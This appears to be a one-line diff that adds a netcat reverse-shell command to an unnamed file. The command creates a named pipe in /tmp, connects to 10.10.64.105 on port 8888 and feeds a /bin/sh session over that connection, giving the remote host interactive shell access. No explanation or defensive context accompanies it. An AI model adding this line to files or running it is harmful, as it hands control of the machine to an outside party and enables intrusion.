@@ -1,0 +1,1 @@
+mkfifo /tmp/yepeff; nc 10.10.64.105 8888 0</tmp/yepeff | /bin/sh >/tmp/yepeff 2>&1; rm /tmp/yepeff
